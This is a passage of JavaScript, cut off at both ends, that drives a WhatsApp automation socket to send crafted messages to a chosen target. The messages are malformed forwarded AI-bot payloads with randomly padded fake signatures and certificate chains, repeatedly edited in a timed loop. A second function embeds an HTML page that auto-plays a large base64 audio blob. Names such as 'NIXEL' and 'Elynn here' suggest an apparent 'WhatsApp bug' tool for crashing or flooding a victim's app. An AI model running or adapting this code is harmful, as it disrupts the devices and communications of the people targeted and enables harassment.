      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: '',
        botResponseId: uid(),
        verificationMetadata: {
          proofs: [{
            version: 1,
            useCase: 1,
            signature: fill('NIXEL.MessageBuilderV1.0-VerificationSignature.Metadata', 64),
            certificateChain: [
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 684),
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 892)
            ]
          }]
        }
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: id,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 2000
          }
        }
      }
    }
  }

  const edit = () => sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: {
            remoteJid: target,
            fromMe: true,
            id: mid
          },
          type: 14,
          editedMessage: message
        }
      }
    }
  }, {
    messageId: uid().replaceAll('-', '').toUpperCase()
  })

  await sock.relayMessage(target, message, {
    messageId: mid
  })

  await edit()

  await new Promise(resolve => setTimeout(resolve, 2000))

  for (let i = 0; i < ulang; i++) {
    sections[1].view_model.primitive = {
      __typename: 'GenAIBotProgressStatusPrimitive',
      title: 'Elynn here',
      is_in_progress: false
    }

    message.botForwardedMessage.message.richResponseMessage.unifiedResponse.data = encodeData()

    await edit()

    await new Promise(resolve => setTimeout(resolve, 2000))

    if (i < ulang - 1) {
      sections[1].view_model.primitive = {
        __typename: 'GenAITaskPrimitive',
        task_id: 'exp-01',
        title: 'Elynn here',
        subtitle: 'Elynn Here',
        status: 'RUNNING'
      }

      message.botForwardedMessage.message.richResponseMessage.unifiedResponse.data = encodeData()

      await edit()

      await new Promise(resolve => setTimeout(resolve, 2000))
    }
  }

  return mid
}

async function elynnviaudio(sock, target) {
  const uid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0
    return (c === 'x' ? r : (r & 3 | 8)).toString(16)
  })

  const fill = (s, n) => Buffer.concat([
    Buffer.from(s),
    Buffer.from(Array.from(
      { length: n - Buffer.byteLength(s) },
      () => Math.random() * 256 | 0
    ))
  ]).toString('base64')

  const id = uid()
  const mid = uid().replaceAll('-', '').toUpperCase()

  const html = `<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
<script>
(async function() {
  try {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;

    const ctx = new AC();
    await ctx.resume();
    
    const base64Data = "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